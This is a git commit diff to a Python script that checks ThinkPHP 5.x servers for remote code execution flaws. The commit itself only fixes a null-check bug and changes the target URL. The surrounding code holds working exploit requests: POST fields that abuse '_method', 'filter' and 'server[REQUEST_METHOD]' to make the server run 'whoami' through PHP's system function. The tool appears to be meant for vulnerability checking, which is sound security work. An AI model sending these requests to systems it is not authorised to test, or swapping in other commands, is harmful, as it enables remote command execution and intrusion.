8f24e1ddf89095c5eb705b087e00c98690352bb2
1ightz <lzhd24@gmail.com>
2019-01-15 22:08:00 +0800

    Update thinkphp_rce_check.py

--- thinkphp_rce_check.py
+++ thinkphp_rce_check.py
@@ -20,8 +20,8 @@ def check5023(url):
     http = urllib3.PoolManager()
     r = http.request("POST",url+"/public/index.php?s=captcha",fields={"server[REQUEST_METHOD]":"whoami","filter[]":"system","_method":"__construct","method":"get"})
     result = re.search(r"(?<=\"echo\">).*?(?=</div>)",str(r.data),re.S)
-    user = result.group(0).replace(" ","").strip("\r\n\\r\\n")
     if result:
+        user = result.group(0).replace(" ","").strip("\r\n\\r\\n")
         if user:
             print(url,"5023 Vulnerable",user)
         else:
@@ -33,8 +33,8 @@ def check5152(url):
     http = urllib3.PoolManager()
     r = http.request("POST",url+"/public/index.php",fields={"a":"system","b":"whoami","_method":"filter"})
     result = re.search(r".*?(?=<style)",str(r.data),re.S)
-    user = result.group(0).replace(" ","").strip("\r\n\\r\\n")
     if result:
+        user = result.group(0).replace(" ","").strip("\r\n\\r\\n")
         if user:
             print(url,"5152 Vulnerable",user)
         else:
@@ -43,7 +43,7 @@ def check5152(url):
         print(url,"5152 Not Vulnerable")
 
 if __name__ == "__main__":
-    urls = ["http://10.67.9.24/tp5132/"]
+    urls = ["http://127.0.0.1"]
     for url in urls:
         try:
             check5010(url)
